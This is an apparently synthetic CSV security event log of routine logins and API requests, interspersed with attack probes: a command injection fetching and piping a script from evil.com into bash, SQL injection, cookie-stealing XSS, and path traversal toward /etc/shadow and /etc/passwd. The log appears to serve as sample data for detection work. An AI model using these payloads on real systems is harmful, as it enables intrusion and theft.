event_id,timestamp,event_type,source_ip,user_agent,endpoint,http_method,query_params,username,auth_result,failure_reason,dest_port,protocol,connection_result,response_code,response_time_ms
7d6dbf8b-f809-4d96-8c1d-98cebf214e19,2024-12-01T09:57:01.370091Z,AUTH_ATTEMPT,10.0.0.52,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,jane.smith,LOGOUT,,,,,200,46
401ace54-1d13-400c-b794-60c735b25ed3,2024-12-01T09:58:09.091877Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/settings,GET,,,,,,,,200,215
b0575a3f-1906-484a-a2ae-379a29601e9f,2024-12-01T09:59:20.634842Z,HTTP_REQUEST,192.168.1.103,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/orders,GET,,,,,,,,204,355
ec0e2fc5-1cb4-4ec7-82cd-619687e10117,2024-12-01T10:00:48.389986Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/search,POST,,,,,,,,200,49
a2f0b553-7c0f-4100-8dc2-4f30c7caf162,2024-12-01T10:05:53.129018Z,AUTH_ATTEMPT,192.168.1.102,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,chris.miller,SUCCESS,,,,,200,167
44c415ce-3740-4891-9bd4-7b47b73da986,2024-12-01T10:08:20.527610Z,AUTH_ATTEMPT,172.16.0.10,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/logout,POST,,andrew.rodriguez,LOGOUT,,,,,200,67
5d3d53a4-887f-4865-ba89-7a3214bce4b2,2024-12-01T10:11:48.872725Z,HTTP_REQUEST,162.247.74.27,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/.env,GET,,,,,,,,403,44
59cb1c1b-8dea-4d0f-8181-de8d955b76ef,2024-12-01T10:13:10.594573Z,AUTH_ATTEMPT,192.168.1.103,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,jennifer.white,LOGOUT,,,,,200,56
cfc60af0-6301-48e0-908b-2e4a85046582,2024-12-01T10:17:02.036747Z,AUTH_ATTEMPT,192.168.1.101,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,lisa.thomas,LOGOUT,,,,,200,65
0aaad0f8-436c-4280-9537-19c08410f90d,2024-12-01T10:20:43.106897Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/reports,GET,,,,,,,,201,61
b3bb345f-eb1d-4ef6-bfe7-5a28e58203f6,2024-12-01T10:24:54.591546Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/products,GET,,,,,,,,200,313
78d465fa-21bf-478c-8f57-56298ebd54fb,2024-12-01T10:27:08.783105Z,AUTH_ATTEMPT,10.0.0.52,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,POST,,andrew.rodriguez,SUCCESS,,,,,200,189
97131c2c-120c-499c-b713-841d21a2fd16,2024-12-01T10:32:46.410941Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/orders,GET,,,,,,,,201,118
c5163930-49bc-4332-ba52-8b6928c06107,2024-12-01T10:36:57.787535Z,HTTP_REQUEST,10.0.0.53,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,,,,,,,200,104
5230a044-2073-4005-be9d-994eb2d9d663,2024-12-01T10:39:52.738588Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/orders,GET,,,,,,,,200,320
249012b9-8edf-426b-8d95-9a7eeb5b5cc1,2024-12-01T10:44:30.229845Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/users,POST,,,,,,,,204,388
69552b4f-b30b-4f44-a8b7-07840959065d,2024-12-01T10:47:44.558301Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/reports,GET,,,,,,,,200,181
3fd477ae-b9bd-4431-ac62-092a918d6099,2024-12-01T10:49:20.716240Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/reports,GET,,,,,,,,200,168
4d4c5218-7d33-41ae-bbb3-5f5e5df39202,2024-12-01T10:51:58.357241Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/products,GET,,,,,,,,200,104
9e5d0dbe-9568-48a6-841d-235742802a0c,2024-12-01T10:52:58.150923Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/profile,POST,,,,,,,,201,352
24634fa5-4deb-4e17-8c71-375a96220b2f,2024-12-01T10:53:21.106233Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/profile,GET,,,,,,,,200,99
a82d8d08-263b-461d-af92-f57e1ffb1b75,2024-12-01T10:58:41.613057Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,GET,,,,,,,,200,35
db50655a-d678-43c0-8395-1ee750fe5724,2024-12-01T11:02:21.425272Z,AUTH_ATTEMPT,10.0.0.54,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,stephanie.lewis,LOGOUT,,,,,200,42
00bcbacb-1015-4ca3-adc3-5d7081aeae90,2024-12-01T11:03:21.408166Z,HTTP_REQUEST,209.141.47.245,Nmap Scripting Engine,/api/users,POST,search=' AND SLEEP(5) --,,,,,,,200,1467
0d460380-f9cc-49d2-b74f-bb113825c49a,2024-12-01T11:06:01.048936Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/about,GET,,,,,,,,200,296
916736d2-11eb-4eca-bfb0-696772bd55d6,2024-12-01T11:08:29.214115Z,AUTH_ATTEMPT,192.168.1.102,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,POST,,ashley.martin,SUCCESS,,,,,200,97
31cca5fe-a936-4e8e-904d-f0a44ea204a4,2024-12-01T11:11:58.636545Z,HTTP_REQUEST,172.16.0.14,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/search,GET,,,,,,,,200,36
bb8604d1-a7e2-4c3b-a6b0-e9cabf1a2821,2024-12-01T11:13:05.582030Z,HTTP_REQUEST,192.168.1.102,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/reports,POST,,,,,,,,201,135
fbeb8ca7-d698-4a05-8138-d8877246495f,2024-12-01T11:17:43.478688Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/orders,GET,,,,,,,,204,262
25643661-c866-469e-b944-59ae190b8add,2024-12-01T11:20:49.301540Z,AUTH_ATTEMPT,192.168.1.104,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,andrew.rodriguez,LOGOUT,,,,,200,58
606b0cc6-0e80-4dfe-9256-cb5d980a182a,2024-12-01T11:23:07.824130Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/help,GET,,,,,,,,201,133
6426d989-c508-4216-9e32-c578c7ec62f6,2024-12-01T11:26:21.323015Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/profile,GET,,,,,,,,200,306
30a7c6c4-b5f1-4376-8079-45e933870b6e,2024-12-01T11:26:30.773394Z,HTTP_REQUEST,192.168.1.103,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/debug,GET,,,,,,,,200,26
352a2b08-2510-47e3-94bb-dc93997eb38b,2024-12-01T11:30:21.451100Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/home,POST,,,,,,,,201,269
009cb93a-84c0-40a5-90c9-382ab9d254e0,2024-12-01T11:32:47.983239Z,HTTP_REQUEST,194.26.192.64,gobuster/3.5,/files/....//....//....//etc/shadow,GET,,,,,,,,403,44
71c9e82c-2225-4137-9b6d-71ba8f646881,2024-12-01T11:35:42.787721Z,HTTP_REQUEST,192.168.1.104,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/orders,GET,,,,,,,,201,170
2fc0ea5a-d177-41f8-9f86-f540e4aaff33,2024-12-01T11:36:48.735010Z,HTTP_REQUEST,192.168.1.103,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/search,GET,,,,,,,,201,99
03c4808b-9b2e-4c29-bf28-3b63489f9a48,2024-12-01T11:37:55.151725Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/docs,GET,,,,,,,,200,354
c9fd3e12-89e4-436c-ada8-a40a79df979a,2024-12-01T11:40:34.120565Z,HTTP_REQUEST,172.16.0.10,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/about,POST,,,,,,,,204,210
2c66733f-ea02-4408-80dd-4d5d95e0a6e5,2024-12-01T11:43:09.043561Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/about,GET,,,,,,,,200,168
961dc22f-2905-45e2-b998-986ea9f08251,2024-12-01T11:47:10.390683Z,HTTP_REQUEST,172.16.0.10,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/about,GET,,,,,,,,200,249
ee0aab87-50d3-403a-9d8e-d576be796630,2024-12-01T11:48:16.209128Z,HTTP_REQUEST,192.168.1.102,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/profile,GET,,,,,,,,200,349
b04b9c56-8f47-40cc-8d1f-910593967276,2024-12-01T11:49:00.981839Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/profile,POST,,,,,,,,200,399
96b0baef-88ba-4481-8598-20547c899f0b,2024-12-01T11:51:00.230179Z,HTTP_REQUEST,195.54.160.149,Nmap Scripting Engine,/api/config,GET,,,,,,,,401,90
0f35b91c-8d0c-42f3-b142-652a5a2a4b95,2024-12-01T11:51:45.697279Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/help,GET,,,,,,,,204,266
2ce00a7e-956f-4c30-bcb5-ffc6a7c9cc43,2024-12-01T11:53:49.968936Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/users,GET,,,,,,,,201,66
9cb46fa8-a018-4891-beae-bf4fcd9b1668,2024-12-01T11:53:52.847953Z,HTTP_REQUEST,185.220.101.45,Wget/1.21.1,/api/diagnostic,GET,host=localhost`curl http://evil.com/malware.sh | bash`,,,,,,,500,2760
c49af17d-5ed5-4785-8035-01e8406ad1ed,2024-12-01T11:55:26.472899Z,HTTP_REQUEST,172.16.0.12,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,GET,,,,,,,,204,336
777eb824-a59d-44a0-8077-115dea3602ad,2024-12-01T11:57:08.563082Z,HTTP_REQUEST,172.16.0.14,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/profile,POST,comment=<img src=x onerror=alert(document.cookie)>,,,,,,,400,116
962032a1-c193-4b38-a240-99433e1d5740,2024-12-01T11:57:11.707095Z,HTTP_REQUEST,91.240.118.172,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/search,POST,q=<iframe src='javascript:alert(1)'>,,,,,,,200,97
34d742ea-aab6-444c-b5c7-b1bf1d7fa2ec,2024-12-01T11:59:40.562580Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/contact,GET,,,,,,,,201,275
b4377509-c68c-4bc7-b92f-ebf844241b8c,2024-12-01T12:02:01.822598Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/analytics,GET,,,,,,,,200,284
1f9b2570-ed37-4abc-88bd-f1c7e3ae0191,2024-12-01T12:06:38.333162Z,HTTP_REQUEST,192.168.1.100,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/dashboard,POST,,,,,,,,204,351
de790369-f473-41a5-819a-d30aa7f1c428,2024-12-01T12:10:59.135723Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/reports,POST,,,,,,,,200,121
4e39b8db-b206-45ce-ad1e-f613541f1762,2024-12-01T12:11:13.918472Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/notifications,GET,,,,,,,,200,77
8571d16d-c568-49a8-be0b-407cbbf296e2,2024-12-01T12:15:16.420378Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/dashboard,GET,,,,,,,,204,199
0eb967ac-55a2-4f88-9486-c8dd36c44912,2024-12-01T12:19:23.043708Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/about,GET,,,,,,,,200,244
1b3d01bb-0de0-4a09-8888-3be352e40151,2024-12-01T12:22:20.810783Z,HTTP_REQUEST,172.16.0.10,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,GET,,,,,,,,204,332
65c46ef5-c69f-4572-980a-b7b55250d60f,2024-12-01T12:26:49.059461Z,AUTH_ATTEMPT,192.168.1.100,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,lisa.thomas,LOGOUT,,,,,200,48
c03d736d-52f6-40a8-8928-5cbb72be4693,2024-12-01T12:28:41.250661Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/about,GET,,,,,,,,200,231
8554d262-d686-4316-b9f8-667b3998c257,2024-12-01T12:28:53.481586Z,HTTP_REQUEST,103.75.201.4,gobuster/3.5,/files/....//....//....//etc/shadow,GET,,,,,,,,404,14
c85dbcab-e118-4be2-960c-0d8d0d722fd7,2024-12-01T12:29:38.972297Z,AUTH_ATTEMPT,172.16.0.14,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,POST,,andrew.rodriguez,SUCCESS,,,,,200,240
68f4b2cf-8311-40f7-a0dc-8a87b274b064,2024-12-01T12:31:37.026316Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/search,GET,,,,,,,,200,245
0c074694-8150-402e-bdb2-45c5d27c05eb,2024-12-01T12:33:23.976266Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/products,POST,,,,,,,,200,57
6c2cf945-e312-41aa-af71-9afacf924db4,2024-12-01T12:34:27.457319Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,GET,,,,,,,,204,233
9ba9698a-c6f9-46b8-8de0-f8e262332b23,2024-12-01T12:36:07.921020Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/help,GET,,,,,,,,200,97
5ea7bef8-99c9-411c-9320-43ce5fdbb12e,2024-12-01T12:40:10.718979Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/settings,GET,,,,,,,,200,121
80e64ea9-643b-45d5-874e-710dc90a3fda,2024-12-01T12:40:43.495487Z,HTTP_REQUEST,23.129.64.100,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/admin,POST,,,,,,,,401,79
0d479ca0-6b50-413d-a69b-8fa2fcdcc4fc,2024-12-01T12:45:05.315326Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/dashboard,POST,,,,,,,,201,394
eb2cdeba-c0b2-4dcd-a36c-d78369f950c7,2024-12-01T12:49:46.467604Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,GET,,,,,,,,200,382
dc2e7f72-59d0-49c3-9fc2-1c46b64c95c3,2024-12-01T12:51:14.821368Z,HTTP_REQUEST,172.16.0.12,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/about,POST,,,,,,,,200,139
c1582058-b34a-4cb0-b024-14315c647799,2024-12-01T12:53:21.510056Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/search,POST,,,,,,,,200,262
1f402f3e-349d-4ce1-9bb6-9032c5c8786c,2024-12-01T12:56:00.698765Z,AUTH_ATTEMPT,10.0.0.53,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,POST,,mike.wilson,LOGOUT,,,,,200,77
4c5d0675-fa6f-4807-94c8-f0e891e2732a,2024-12-01T12:57:14.065009Z,AUTH_ATTEMPT,10.0.0.53,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,matthew.robinson,LOGOUT,,,,,200,72
22594543-52ee-4f5b-9ba5-6280e470a2c3,2024-12-01T12:59:31.842007Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/reports,GET,,,,,,,,204,246
11e99db1-c32d-42fc-90de-2d7d72065b38,2024-12-01T13:04:11.806248Z,AUTH_ATTEMPT,192.168.1.104,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/logout,POST,,nicole.clark,LOGOUT,,,,,200,31
90444225-5b68-4c14-95c5-e99da621b06d,2024-12-01T13:05:39.655294Z,AUTH_ATTEMPT,192.168.1.100,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,amanda.taylor,LOGOUT,,,,,200,62
88956eb4-7151-4e79-99ae-d5565b8fb9d2,2024-12-01T13:10:38.084014Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/about,GET,,,,,,,,201,211
d9b73b2d-2fa7-4ce1-b72f-5a09acf36ec3,2024-12-01T13:11:58.913429Z,HTTP_REQUEST,10.0.0.53,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/contact,POST,,,,,,,,200,248
d35ea518-965d-4731-b6d3-9307096c0b71,2024-12-01T13:15:10.192272Z,HTTP_REQUEST,192.168.1.103,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/docs,GET,,,,,,,,201,161
58482993-b0aa-4818-a18f-9805cbeb6325,2024-12-01T13:19:46.130812Z,HTTP_REQUEST,192.168.1.103,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/about,GET,,,,,,,,200,238
466ba0a1-4fde-439f-8f25-5c7edfa74001,2024-12-01T13:24:29.448192Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/home,GET,,,,,,,,200,42
8ae7cb8b-f3a1-4ed8-94f9-f6153306d244,2024-12-01T13:29:59.719875Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/users,POST,,,,,,,,200,242
36f0c098-9eb8-48de-b4d7-2092c1a37d46,2024-12-01T13:32:28.841622Z,AUTH_ATTEMPT,192.168.1.102,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,POST,,jennifer.white,SUCCESS,,,,,200,151
b273155c-8ef2-45a3-8c1f-4dd44a2775a9,2024-12-01T13:35:09.834107Z,AUTH_ATTEMPT,192.168.1.101,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,emily.davis,SUCCESS,,,,,200,185
8f759b99-4e0e-431c-834d-15a6f4d7d9d1,2024-12-01T13:40:56.490470Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/contact,POST,,,,,,,,200,114
8448e033-9596-40f1-b3b5-22a2a6964341,2024-12-01T13:41:21.376292Z,HTTP_REQUEST,45.129.56.200,masscan/1.3.2,/files/../../../etc/passwd,GET,,,,,,,,403,17
29bb079d-e61f-4b5c-9f59-fa3a10cf77c5,2024-12-01T13:45:29.278945Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/search,GET,,,,,,,,200,356
